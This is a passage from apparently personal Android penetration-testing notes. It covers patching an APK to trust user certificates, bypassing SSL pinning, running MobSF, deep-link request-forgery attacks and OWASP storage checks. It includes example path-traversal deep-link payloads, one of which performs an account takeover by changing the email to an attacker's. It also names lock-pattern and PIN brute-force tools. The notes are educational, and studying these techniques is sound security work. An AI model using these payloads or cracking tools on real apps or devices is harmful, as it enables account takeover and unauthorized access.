as System even if u r in a rooted device, as that would cause errors in Root Detection Bypasses</p><figure id="d85ccc4a-8270-406f-baf1-0443d9ca6656" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2097.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2097.png"/></a></figure><p id="cf7a5a31-7a3f-462d-9ebd-917161a3fcc0" class="">and as we see in the NSC.xml file ⇒ src of certs is only system</p><p id="71c096f0-ea68-429d-a85b-84599d2fd2e9" class=""><em><span style="border-bottom:0.05em solid"><strong>Solution here to Batch the APK:</strong></span></em></p><p id="55fd222c-8b1d-4fc5-a4b3-7e1e6c181bdf" class="">1- check in AndroidManifist for the NSC file</p><figure id="bc1bd80b-ad4f-436d-9bc3-b8db74eb6a66" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2098.png"><img style="width:816px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2098.png"/></a></figure><p id="777a7012-90a5-4c24-a84d-e7033a6dae2f" class="">2- apktool decompile</p><figure id="6df6ef0b-322b-4490-8d18-3ffb45bcd9ee" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2099.png"><img style="width:624px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2099.png"/></a></figure><p id="d78b83a6-e2fd-44e1-94e4-6fea910f940d" class="">3- Reach the file and add user trust</p><figure id="12b41927-d983-4cc4-bab2-67da348c4468" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20100.png"><img style="width:624px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20100.png"/></a></figure><p id="bf48c7df-7c40-4474-a8f6-6ffdfc5f33e1" class="">4- Rebuild using APKtool</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ca59ea8-f23a-4bae-9bbd-3e6aa929a61f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">java -jar /bin/apktool.jar b indeed -o patched_indeed.apk #use this
apktool b APK-Dir/ -o APK_PATCHED.apk</code></pre><figure id="079417a3-1b49-48f6-a460-d08a3174dfc7" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20101.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20101.png"/></a></figure><p id="7eb3a83f-06cc-4661-b67b-411eef227a84" class="">5- Set certificates for the batched apk using </p><p id="a0e8c920-f4c8-4752-99f3-c19662796a9f" class=""><a href="https://github.com/patrickfav/uber-apk-signer.git">https://github.com/patrickfav/uber-apk-signer.git</a></p><figure id="fd20c89a-c0cf-4502-8cd3-d174eeb66a3f" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20102.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20102.png"/></a></figure><p id="05de9118-87ba-4053-8ee2-ff73e1560483" class="">
</p><p id="6129bc82-e843-4236-b8dc-19ad3edde35e" class="">finally adb install it and replace it with the real indeed apk</p><h3 id="0bcec353-60c9-497f-a9df-043bb37b9f9a" class="">You Can bypass SSL Pinning using Frida Code Share , Medusa , Objection</h3><p id="a4fa67e9-09f9-4c0f-b24e-6e90ad168897" class="">Frida use the universal SSl pinning Code share</p><p id="261a436a-ce69-4501-ab57-5475992d778a" class="">Medusa: use universal ssl pinning module</p><p id="02985310-60c9-4b34-91c1-6256a5aeb8f2" class="">Objection:</p><figure id="5c45469d-1dd9-424d-a411-a27bf81fc4f2" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20103.png"><img style="width:676px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20103.png"/></a></figure><p id="6c0cd3c9-77ba-455a-8598-b45c626da3b0" class="">
</p></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>MobSF </strong></summary><div class="indented"><p id="59d86f67-3786-4bf8-9272-5361d9f7d6c2" class=""><mark class="highlight-blue"><strong>⇒ Framework to automate initial analysis for the APK</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d20bc850-e9e9-4ca3-96c8-89aeb897145d" class="code"><code class="language-Bash">docker run -it -m 4g --cpus=4 --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</code></pre><p id="03ae61b7-e71c-461c-87b3-9f71de7a97be" class="">MOBSF, or the Mobile Security Framework, is an open-source mobile application (Android and iOS) automated testing framework that facilitates mobile app security assessment. It provides a set of tools and features to identify security vulnerabilities and weaknesses in mobile applications. Here are some key activities you can perform with the help of MOBSF:</p><ol type="1" id="6bfcf98b-cbb9-405b-9e0f-b6e9829828a5" class="numbered-list" start="1"><li><strong>Static Analysis:</strong><ul id="31d27e7d-53e8-405d-a6db-7e45149d080c" class="bulleted-list"><li style="list-style-type:disc"><strong>Source Code Review:</strong> MOBSF allows you to perform static analysis on the source code of Android applications. It can identify potential vulnerabilities and security issues by analyzing the codebase.</li></ul><ul id="a9422b5b-d914-44af-871f-58ed4b3f25c7" class="bulleted-list"><li style="list-style-type:disc"><strong>Binary Analysis:</strong> MOBSF can analyze the binary (APK) of an Android application without access to the source code, providing insights into potential security risks.</li></ul></li></ol><ol type="1" id="fdf4eddb-5180-4ca1-8d3f-bfd2d0c40881" class="numbered-list" start="2"><li><strong>Dynamic Analysis:</strong><ul id="54f0790d-e2c5-44e2-89fc-da6c2e54807c" class="bulleted-list"><li style="list-style-type:disc"><strong>Dynamic Analysis with Emulation:</strong> You can use MOBSF to dynamically analyze the behavior of mobile applications by emulating their execution in a controlled environment. This helps identify runtime vulnerabilities and behaviors.</li></ul><ul id="1c40b8a5-7098-42db-ae4f-8a4677091b85" class="bulleted-list"><li style="list-style-type:disc"><strong>Network Traffic Analysis:</strong> MOBSF captures and analyzes network traffic generated by the mobile application. This is crucial for identifying potential security risks related to data transmission.</li></ul></li></ol><ol type="1" id="2fdbdf14-6e31-457e-b532-260c5d9eb239" class="numbered-list" start="3"><li><strong>Vulnerability Scanning:</strong><ul id="f2e75d2b-85e1-435e-b992-fdc6ff86f0eb" class="bulleted-list"><li style="list-style-type:disc">MOBSF incorporates various tools and scanners (e.g., OWASP ZAP, MobSF API, and QARK) to scan for common vulnerabilities such as insecure data storage, insecure network communication, and code vulnerabilities.</li></ul></li></ol><ol type="1" id="421cf582-c746-433b-b752-df6f201b77cd" class="numbered-list" start="4"><li><strong>API Security Testing:</strong><ul id="f77053d4-a41e-45a9-b128-4102df41103d" class="bulleted-list"><li style="list-style-type:disc">MOBSF assists in testing the security of APIs that mobile applications interact with. It helps identify vulnerabilities such as improper authentication, insecure data transmission, and other API-related security issues.</li></ul></li></ol><ol type="1" id="29c2e106-8413-4c27-a482-1dd73f187b9b" class="numbered-list" start="5"><li><strong>Reporting and Documentation:</strong><ul id="224e8099-c6d2-4020-86fd-c2f4e4186c8d" class="bulleted-list"><li style="list-style-type:disc">MOBSF provides comprehensive reports summarizing the findings of the analysis. These reports include details on identified vulnerabilities, their severity, and recommendations for remediation.</li></ul></li></ol><ol type="1" id="95a40d75-7880-4c6e-9b8f-f53ffdb1b819" class="numbered-list" start="6"><li><strong>Integration with CI/CD Pipelines:</strong><ul id="4e706b32-17af-48c6-b993-092a26a2de83" class="bulleted-list"><li style="list-style-type:disc">MOBSF can be integrated into continuous integration and continuous deployment (CI/CD) pipelines, allowing for automated security testing during the development lifecycle.</li></ul></li></ol><ol type="1" id="51c6ca2c-5ac9-4c6d-aaaa-24118b76b787" class="numbered-list" start="7"><li><strong>Customization and Extensibility:</strong><ul id="948baac1-8722-4e98-a0e4-5e4f22ea3276" class="bulleted-list"><li style="list-style-type:disc">MOBSF is customizable and extensible, allowing security professionals to add their custom rules, plugins, or modules for tailored security assessments.</li></ul></li></ol><ol type="1" id="1cb4ec69-2e1e-45d3-923c-68cdd6689d8f" class="numbered-list" start="8"><li><strong>Compliance Checks:</strong><ul id="39627104-7cfc-451a-b474-17d5e0669d6d" class="bulleted-list"><li style="list-style-type:disc">MOBSF includes checks for compliance with mobile application security standards and best practices, including the OWASP Mobile Security Testing Guide.</li></ul></li></ol><ol type="1" id="92582aea-55f0-406f-b818-d691cced5442" class="numbered-list" start="9"><li><strong>Reverse Engineering:</strong><ul id="44c20471-79d8-4357-9caa-89bd0859f1c8" class="bulleted-list"><li style="list-style-type:disc">While not a primary feature, MOBSF can assist in basic reverse engineering tasks by providing insights into the structure and behavior of an application.</li></ul></li></ol><ol type="1" id="14919a12-a1e7-42dd-ad41-727718036265" class="numbered-list" start="10"><li><strong>OWASP Mobile Top 10 Coverage:</strong><ul id="2dbe8caf-1cf6-464f-96e1-dd02d72653ff" class="bulleted-list"><li style="list-style-type:disc">MOBSF is designed to cover the OWASP Mobile Top 10, a list of the most critical security risks to mobile applications.</li></ul></li></ol></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Sayed Abdelhafiz Session and Blog</summary><div class="indented"><figure id="9f08366a-7700-49f7-b3c8-7c0e6323e6c7"><a href="https://dphoeniixx.medium.com/exploiting-request-forgery-on-mobile-applications-e1d196d187b3" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Exploiting Request forgery on Mobile Applications.</div><div class="bookmark-description">We will tell a story about the Request forgery family and how it can attack mobile applications.</div></div><div class="bookmark-href"><img src="https://miro.medium.com/v2/resize:fill:152:152/1*sHhtYhaCe2Uc3IU0IgKwIQ.png" class="icon bookmark-icon"/>https://dphoeniixx.medium.com/exploiting-request-forgery-on-mobile-applications-e1d196d187b3</div></div><img src="https://miro.medium.com/v2/resize:fit:1200/1*LRb-0CwwGRtE-fbQJigBdA.png" class="bookmark-image"/></a></figure><figure id="911c045b-1c53-4dc3-8773-bedbe5156dbb" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20104.png"><img style="width:624px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20104.png"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Request Forgery</strong></summary><div class="indented"><p id="10bb94d0-665d-437a-9912-c045a903e7f4" class="">CSRF or SSRF is the most popular web vulnerabilities, both depending on the same concept. </p><ul id="5d953bea-2279-4742-ba3d-eb97e8ac793f" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red">Forgery a part of an authenticated request</mark> to perform an<mark class="highlight-red"> unwanted action or access sensitive data</mark>. </li></ul><ul id="94ecf604-0f03-4040-84cf-95d0b73fef06" class="bulleted-list"><li style="list-style-type:disc">In the mobile application, the same vulnerability class exists. There might be some differences from a web application, but it leads to the same thing. It came from the most common attack surface in a mobile application, which is deep links.</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Deeplinks is evil. No, Not WebView again.</strong></summary><div class="indented"><p id="a333cb03-d0d3-496c-a396-b1157b65a5dc" class="">Deeplinks is now one of the important components of a mobile application. You always want to make it easy for your users to navigate your application components to view specific content. It easy! Implantation of deep links is easy! But parsing the received parameters from it is not easy.</p><p id="ae268f6d-1f5c-4f91-8e51-2f04824ed8e3" class="">Let us imagine that there is a deep link that helps the users to navigate to profile activity, its URI, e.g.: <code>example://app/users?username=dphoeniixx</code></p><p id="457bcccd-8cb7-4f40-9e0e-7acd1fe51336" class="">It’s simple, the application will try to match the deep link path to get target activity, or its configure then parse the inputs to pass it to the next stage. The above case will retrieve <code>username</code> parameter value from the deep link then pass it to the profile activity.</p><p id="fabdfb5c-a6ec-4ee2-abae-10c1c686002e" class="">Profile Activity will send a request to the server to retrieve the user’s profile. Some APIs use parameters only for their inputs; some may use parameter and path segments. let’s imagine the following: <code>https://api.example.com/v1/users/{username}</code> is the endpoint that the application will send a request to it to retrieve the user’s profile</p><p id="15208f36-6fad-4026-91e4-f1a7bc016905" class="">Here is the problem come, in this case, the attacker can forgery the request path using path traversal, e.g.: <code>example://app/users?username=../../unwanted-endpoint%3fparam=value</code> will request -&gt; <a href="https://api.example.com/unwated-endpoint?param=value"><code>https://api.example.com/unwated-endpoint?param=value</code></a></p><p id="2e9f5f25-9d79-4c89-8cb9-c9360b65ff00" class="">Some deep links don’t parse their inputs from parameters, maybe path segments! e.g. : <code>example://app/users/dphoeniixx</code>. It’s still vulnerable; the attacker can encode the path traversal payload like that: <code>example://app/users/..%2f..%2funwanted-endpoint%3fparam=value</code>, don’t worry about the encoded input, Uri.getPathSegments Method will decode every path segment:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eb6fa331-952b-4b0e-979e-1b2a497379c3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">while ((current = path.indexOf(&#x27;/&#x27;, previous)) &gt; -1) {
    // This check keeps us from adding a segment if the path starts
    // &#x27;/&#x27; and an empty segment for &quot;//&quot;.
    if (previous &lt; current) {
        String decodedSegment
                = decode(path.substring(previous, current));
        segmentBuilder.add(decodedSegment);
    }
    previous = current + 1;
}</code></pre><p id="ecf577b4-c552-4759-877a-db7d7284c99d" class="">Sometimes developers don’t use getPathSegments method to retrieve the URI’s path segments, but anyway, almost all web-server will decode the path and redirect to the canonicalized path, e.g.:</p><p id="54560f16-7e26-4689-a5c1-17681277cc1c" class=""><code>GET /v1/users/..%2f..%2funwated-endpoint%3fparam=value HTTP/1.1</code> -&gt; <code>HTTP/1.1 302..\nLocation: /unwanted-endpoint?param=value</code></p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>What after forgery Path?</strong></summary><div class="indented"><p id="853852a7-daa9-4d90-bb59-de6d13463300" class="">The above example is difficult to exploit. It requires chaining with an open redirect or something. I will skip it now to start from easy exploits.</p><p id="0caccfe7-7f06-43a0-8763-a05fb35c5812" class="">Some deep links lead to sending a forgery request path by <code>POST</code>, <code>PUT</code> or <code>DELETE</code> method. It is common on coupons, invites, promocodes, etc...</p><p id="55bc05b8-a6c2-4ee5-8c29-2e0b3c92de65" class="">We can exploit it and forgery the request path to any endpoint that can do harmful things to the user, e.g.: <code>example://app/promo?code=../users/me%3femail=attacker@gmail.com</code> -&gt; <code>POST /v1/users/me?email=attacker@gmail.com</code> (Account Takeover)</p><p id="c86ac943-2269-4866-bab6-8fc057df4b4d" class="">Please notice most of the time. You can put the POST body on the query string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c251af60-7aa5-4509-8a88-c569abd2b225" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /change HTTP/1.1
....

password=123456</code></pre><p id="ca7f00fc-c7e1-4993-ae2b-e8d54a1d0015" class="">Same as</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="052b4a5a-1d2b-4919-a11b-7ad8ba1da3c4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /change?password=123456 HTTP/1.1
....
</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">OWASP MASTG</summary><div class="indented"><figure id="71d73c01-dad2-4dbb-a3b3-815bc30fd6ea"><a href="https://mas.owasp.org/MASTG/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">OWASP MASTG - OWASP Mobile Application Security</div></div><div class="bookmark-href"><img src="https://mas.owasp.org/assets/logo_circle.png" class="icon bookmark-icon"/>https://mas.owasp.org/MASTG/</div></div></a></figure><figure id="c2e2ef49-4066-4544-92e9-d936148c8951" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20105.png"><img style="width:700px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%20105.png"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Android Data Storage</summary><div class="indented"><p id="3c910c9e-ca0b-4b97-9527-56deadc5c31f" class="">1- check shared preferences (the code will show that he is storing inside it)</p><p id="0cd89723-3c99-480c-8128-1ab2786d0f63" class="">2- check databases if its encrypted or not</p><p id="11b9b510-f0b9-479a-8f0e-f273c4da237a" class="">3- if there is <code>createTempFile()</code> , check for temp files.</p><p id="75cab986-97d2-42dc-b2e0-00f31bbec4b3" class="">4- if the app has storage permission access then he can access <code>/sdcard</code> </p><ul id="874cb8e4-f927-4981-8910-fc0621581ae9" class="toggle"><li><details open=""><summary><mark class="highlight-yellow">Android pattern cracker tools :</mark></summary><figure id="c7cded8c-f431-4e5c-86d5-05fe408ed8d5"><div class="source">https://github.com/AleDiBen/APLBreaker</div></figure><p id="9b7a0e85-9194-4e0b-83c5-81a94a122452" class=""> <a href="https://github.com/sch3m4/androidpatternlock">https://github.com/sch3m4/androidpatternlock</a></p><p id="cb204a05-7691-406c-82d6-3113584b6d95" class="">this tools are for <mark class="highlight-yellow">applications</mark> but for the device pattern itself, you can use another tools. </p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="ecda29c8-b7bf-4721-b8bf-9c71c32ff0bd"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Device passwords will be stored at <code>/data/system/gesture.key</code></div></figure><p id="d74a5eaa-48ab-49a7-a130-7c2a880795a4" class="">
</p><p id="fb0544bf-2f56-452a-8b5e-8671a6e6a445" class="">
</p></details></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="137bf09f-ce3d-4412-ab81-dc2723770569"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">IF you have kali-hunter on your mobile you can install this tool <code>Android-PIN-BruteForce</code> and connect the device physically to another one and crack its password. </div></figure></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Good Resources</summary><div class="indented"><figure id="ce66b089-94df-4f73-b819-4bd534ccb289"><div class="source">https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet.git</div></figure><figure id="1e3a7dad-9d3d-408d-9143-e87fc7a24117"><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Android Applications Pentesting</div></div><div class="bookmark-href"><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/collections%2FmuMguNrsRx2mNyNqEox4%2Ficon%2F1qCJ0VIDlWcvGSecYCDq%2Ffondo.png?alt=media&amp;token=1e721267-450f-43f3-861b-6c4f93278e93" class="icon bookmark-icon"/>https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting</div></div><img src="https://www.gitbook.com/cdn-cgi/image/width=1280,dpr=2,height=640,fit=contain,format=auto/https%3A%2F%2F1517081779-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FmuMguNrsRx2mNyNqEox4%252Fsocialpreview%252FNtYxX5Um1Ml0KhPq6gZR%252Ffondo.png%3Falt%3Dmedia%26token%3D257c330a-9e87-4c69-bb95-c0b54588ea79" class="bookmark-image"/></a></figure><figure id="93adeca6-7a92-4771-b261-7751a039545d"><a href="https://github.com/OWASP/owasp-mastg/tree/master/Document" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://github.com/OWASP/owasp-mastg/tree/master/Document</div></div></a></figure><p id="8e27a16a-3382-49c6-a393-f1c233a0321e" class="">CTFs:</p><figure id="e38aa091-e007-4262-9bcf-dae6cc53e0e4"><a href="https://github.com/xtiankisutsa/awesome-mobile-CTF#mobile-ctf-challenges" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">GitHub - xtiankisutsa/awesome-mobile-CTF: This is a curated list of mobile based CTFs, write-ups and vulnerable apps. Most of them are android based due to the popularity of the platform.</div><div class="bookmark-description">This is a curated list of mobile based CTFs, write-ups and vulnerable apps. Most of them are android based due to the popularity of the platform.  - GitHub - xtiankisutsa/awesome-mobile-CTF: This i...</div></div><div class="bookmark-href"><img src="https://github.com/fluidicon.png" class="icon bookmark-icon"/>https://github.com/xtiankisutsa/awesome-mobile-CTF#mobile-ctf-challenges</div></div><img src="https://opengraph.githubassets.com/4f0bc5a8ef1ca38dfecd9cbc067dd8a7b72136782cfcba334cadd11a1841c98e/xtiankisutsa/awesome-mobile-CTF" class="bookmark-image"/></a></figure></div></details><p id="07c37e07-ffc9-4104-a3c2-89d522e787f1" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>